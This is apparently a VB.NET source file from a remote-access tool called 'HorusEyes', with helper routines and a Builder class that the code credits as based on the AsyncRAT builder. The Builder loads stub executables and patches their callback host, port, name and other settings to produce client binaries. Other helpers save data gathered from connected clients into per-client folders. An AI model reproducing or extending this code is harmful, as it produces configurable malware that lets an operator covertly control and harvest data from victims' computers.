Imports System.Data.SQLite
Imports System.IO
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Text
Imports System.Threading
Imports dnlib.DotNet

Public Class Helpers
    ' Public Shared Sub Sender(C As Clients, P As PacketLib.Packet.PacketMaker)
    '  Dim B As New BinaryFormatter
    '     Task.Run(Sub() B.Serialize(C.C.GetStream, P))
    '   End Sub

    Public Shared Sub Form_Checker(ByVal Name As Form, ByVal Thread_Form As Threading.Thread)

        If Name Is Nothing Then

            Name = New Form

            Thread_Form = New Thread(Sub() Application.Run(Name))

            Thread_Form.Start()

        Else

            Name.Show()

        End If

    End Sub

    Public Shared Sub SetSavingFor2Columns(ByVal L As ListView, ByVal ID As String, ByVal SEP As String)
        Try


            Dim H As New StringBuilder
            For Each i As ListViewItem In L.Items
                H.AppendLine(L.Columns(0).Text & ": " & i.Text & vbNewLine & L.Columns(1).Text & ": " & i.SubItems(1).Text & vbNewLine)
            Next
            Dim today = Date.Today
            Dim day = today.Day
            Dim month = today.Month

            Dim Path As String = Application.StartupPath & "\Users\" & ID.Replace(":", "_") & day & month & "\" & SEP
            Static J As New Random
            If IO.Directory.Exists(Path) Then
                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & "_" & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
            Else
                IO.Directory.CreateDirectory(Path)
                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & "_" & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
            End If
        Catch ex As Exception
            MessageBox.Show(ex.ToString())
        End Try

    End Sub

    Public Shared Sub SetSavingFor4Columns(ByVal L As AeroListView, ByVal ID As String, ByVal SEP As String)
        Try

            Dim H As New StringBuilder
            For Each i As ListViewItem In L.Items
                H.AppendLine(L.Columns(0).Text & ": " & i.Text & vbNewLine & L.Columns(1).Text & ": " & i.SubItems(1).Text & vbNewLine & L.Columns(2).Text & ": " & i.SubItems(2).Text & vbNewLine & L.Columns(3).Text & ": " & i.SubItems(3).Text & vbNewLine)
            Next
            Dim today = Date.Today
            Dim day = today.Day
            Dim month = today.Month

            Dim Path As String = Application.StartupPath & "\Users\" & ID.Replace(":", "_") & day & month & "\" & SEP
            Static J As New Random
            If IO.Directory.Exists(Path) Then
                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)

            Else
                IO.Directory.CreateDirectory(Path)
                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
            End If

        Catch ex As Exception
            MessageBox.Show(ex.ToString())
        End Try

    End Sub
    Public Shared Function Numeric2Bytes(ByVal b As Double) As String
        Dim bSize(8) As String
        Dim i As Integer

        bSize(0) = "Bytes"
        bSize(1) = "KB" 'Kilobytes
        bSize(2) = "MB" 'Megabytes
        bSize(3) = "GB" 'Gigabytes
        bSize(4) = "TB" 'Terabytes
        bSize(5) = "PB" 'Petabytes
        bSize(6) = "EB" 'Exabytes
        bSize(7) = "ZB" 'Zettabytes
        bSize(8) = "YB" 'Yottabytes

        b = CDbl(b) ' Make sure var is a Double (not just
        ' variant)
        For i = UBound(bSize) To 0 Step -1
            If b >= (1024 ^ i) Then
                Numeric2Bytes = ThreeNonZeroDigits(b / (1024 ^
                    i)) & " " & bSize(i)
                Exit For
            End If
        Next
    End Function

    Private Shared Function ThreeNonZeroDigits(ByVal value As Double) _
      As String
        If value >= 100 Then
            ' No digits after the decimal.
            Return Format$(CInt(value))
        ElseIf value >= 10 Then
            ' One digit after the decimal.
            Return Format$(value, "0.0")
        Else
            Return Format$(value, "0.00")
        End If
    End Function

    Public Shared Function BytesToImage(ByVal Bytesss As Byte()) As Image
        Using mStream As New MemoryStream(Bytesss)
            Return Image.FromStream(mStream)
        End Using
    End Function
    Public Shared Function SplitPath(ByVal P As String) As String
        Dim spl As String() = Split(P, "\")
        Return spl(spl.Length - 1)
    End Function

    Public Shared Sub Flags()
        Dim sqlite_conn As SQLiteConnection

        Dim sqlite_cmd As SQLiteCommand

        Dim sqlite_datareader As SQLiteDataReader

        ' create a new database connection:

        sqlite_conn = New SQLiteConnection("Data Source=Flags.db;Version=3;")
        ' open the connection:

        sqlite_conn.Open()


        sqlite_cmd = sqlite_conn.CreateCommand()

        sqlite_cmd.CommandText = "SELECT Flag FROM Flags"

        sqlite_datareader = sqlite_cmd.ExecuteReader()

        While sqlite_datareader.Read() ' Read() returns true if there is still a result line to read


            Dim Myreader As String = sqlite_datareader.GetString(0)

            Countries.ListOfFlags.Add(Myreader)

        End While

    End Sub
    Public Class Builder
        ''Based on AsyncRat Builder From NyanCat
        Public Sub Build(ByVal Params As Object())
            Dim asmDef As ModuleDefMD = Nothing
            Try
                'asmDef = ModuleDefMD.Load("Stubs/Stub.exe")

                If Params(2) = True Then

                    If Params(4) = True Then
                        asmDef = ModuleDefMD.Load("Stubs/Stub.exe")
                    End If
                    If Params(5) Then
                        asmDef = ModuleDefMD.Load("Stubs/Stub_64.exe")
                    End If

                End If

                If Params(3) = True Then

                    'asmDef = ModuleDefMD.Load("Stubs/Stub_Sharp.exe")
                End If

                Using asmDef
                    Using saveFileDialog1 As New SaveFileDialog()
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe"
                        saveFileDialog1.InitialDirectory = Application.StartupPath
                        saveFileDialog1.OverwritePrompt = False
                        saveFileDialog1.FileName = "HorusClient"
                        If saveFileDialog1.ShowDialog() = DialogResult.OK Then

                            WriteSettings(asmDef, saveFileDialog1.FileName, Params, Params(3))


                            asmDef.Write(saveFileDialog1.FileName)
                            asmDef.Dispose()


                            MessageBox.Show("Done!", "HorusEyes | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information)

                        End If
                    End Using
                End Using
            Catch ex As Exception
                MessageBox.Show(ex.Message, "HorusEyes | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error)
                asmDef?.Dispose()
            End Try

        End Sub
        Private Sub WriteSettings(ByVal asmDef As ModuleDefMD, ByVal AsmName As String, ByVal Params As Object(), ByVal CSharp As Boolean)
            Try

                For Each type As TypeDef In asmDef.Types
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName)
                    asmDef.Name = Path.GetFileName(AsmName)


                    For Each method As MethodDef In type.Methods


                        For i As Integer = 0 To method.Body.Instructions.Count() - 1

                            Try
                                ''This actually doesn't work with C# Stub
                                If method.Body.Instructions(i).Operand.ToString() = "5900" Then
                                    method.Body.Instructions(i).Operand = Params(0).ToString
                                End If

                                If method.Body.Instructions(i).Operand.ToString() = "127.0.0.1" Then
                                    method.Body.Instructions(i).Operand = Params(1).ToString
                                End If

                                If method.Body.Instructions(i).Operand.ToString() = "%I1%" Then
                                    method.Body.Instructions(i).Operand = Params(6).ToString
                                End If

                                If method.Body.Instructions(i).Operand.ToString() = "%TIME%" Then
                                    method.Body.Instructions(i).Operand = Params(7).ToString
                                End If

                                If method.Body.Instructions(i).Operand.ToString() = "%NAME%" Then
                                    method.Body.Instructions(i).Operand = Params(8).ToString
                                End If

                            Catch ex As Exception

                            End Try

                        Next

                    Next


                Next


            Catch ex As Exception

            End Try
        End Sub

    End Class

End Class
